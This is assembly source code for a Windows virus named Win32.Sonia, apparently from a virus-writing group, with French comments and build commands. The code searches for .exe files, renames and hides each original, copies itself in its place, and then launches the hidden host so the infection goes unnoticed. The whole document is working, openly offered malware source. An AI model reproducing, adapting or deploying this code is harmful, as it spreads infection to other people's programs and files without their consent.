; Win32.Sonia virus by Androgyne/RtC
; "Have I fucked up Win32.Sonia ?"
;
;
; @echo off
; tasm32 /m /ml sonia.asm > sonia.lst
; tlink32 /Tpe /aa /c sonia,sonia.exe >> sonia.lst
; del sonia.obj
; del sonia.map
; notepad sonia.lst
;

.386
.model flat, STDCALL

include andro.inc
includelib import32.lib

    extrn FindFirstFileA:PROC
    extrn FindNextFileA:PROC
    extrn MoveFileA:PROC
    extrn CopyFileA:PROC
    extrn GetFileAttributesA:PROC
    extrn SetFileAttributesA:PROC
    extrn WinExec:PROC
    extrn MessageBoxA:PROC
    extrn GetCommandLineA:PROC
    extrn ExitProcess:PROC

.data

virus_name          db 'Win32.Sonia',0
virus_author        db 'Androgyne [RtC][VDS]',0
virus_version       db 'asm version',0

MB_titre            db 'Win32.Sonia',0
MB_text             db 'Have I fucked up Win32.Sonia ?',0
FF_mask             db '*.exe'
FF_data             WIN32_FIND_DATA <>
self_file           db MAX_PATH dup (0)             ; la partie utile de la ligne de commande (voir après)
new_name            db MAX_PATH dup (0)             ; le nouveau nom de la cible
command_line        dd ?                            ; adresse de la ligne de commande

.code

Sonia:

    call GetCommandLineA                            ; on récupère la ligne de commande
    mov dword ptr [command_line], eax               ; on sauvegarde son adresse

    mov esi,eax                                     ; la ligne de commande se présente comme suit :
    inc esi                                         ;  "X:\path\file.exe" options
    lea edi,self_file                               ; ici, on récupère ce qui est entre les deux premiers "
    xor eax,eax
  copy_until_quotes:
    lodsb
    stosb
    cmp al,22h                                      ; est-ce " ?
    jnz copy_until_quotes
    mov byte ptr [edi - 1],0                        ; on arrête la chaîne pour enlever le " (fucking Windows)

    call FindFirstFileA, offset FF_mask, offset FF_data

    mov ebx,eax                                     ; on met l'handle de recherche dans ebx
    inc eax                                         ; a-t-on fini la recherche ?

    jz Exec_Host                                    ; oui, on exécute l'hôte...

Infect:

    lea esi,FF_data.cFileName                       ; on recopie le nom de la nouvelle cible
    lea edi,new_name
    xor eax,eax
  copy_string:
    lodsb
    stosb
    or al,al                                        ; 0 ?
    jnz copy_string                                 ; non, ce n'est pas la fin de la chaîne
    mov byte ptr [edi - 2],'_'                      ; on remplace 'exe' par 'ex_'

    call MoveFileA, offset FF_data.cFileName, offset new_name   ; on change le nom
    or eax,eax
    jz Go_on_searching                              ; si le fichier ex_ existe déjà, on continue de chercher

    call GetFileAttributesA, offset new_name        ; on récupère les attributs
    or eax,FILE_ATTRIBUTE_HIDDEN                    ; on ajoute l'attribut "caché"
    call SetFileAttributesA, offset new_name, eax   ; on remet les attributs

    call CopyFileA, offset self_file, offset FF_data.cFileName, TRUE ; on copie le virus à la place de la cible

Go_on_searching:

    call FindNextFileA, ebx, offset FF_data         ; on continue de chercher

    or eax,eax                                      ; y'en a encore ?
    jnz Infect                                      ; oui, on continue d'infecter...

Exec_Host:

    mov edi, dword ptr [command_line]               ; dans la ligne de commande,
    inc edi                                         ; on va remplacer 'exe' par 'ex_'
    mov eax,22h                                     ; on sait que 'exe' se trouve juste avant le deuxième quote
    mov ecx,MAX_PATH                                ; on évite le premier et on avance jusqu'au second
    repne scasb                                     ; on revient alors un peu en arrière pour changer
    mov byte ptr [edi - 2],'_'                      ; 'exe' en 'ex_' et voilà !

    call WinExec, command_line, SW_SHOWNORMAL       ; on exécute l'hôte avec la ligne de commande modifiée...

Payload:

    call MessageBoxA, 0, offset MB_text, offset MB_titre, MB_ICONASTERISK     ; une simple petite boîte de message

    call ExitProcess, 0                             ; on se casse !

end Sonia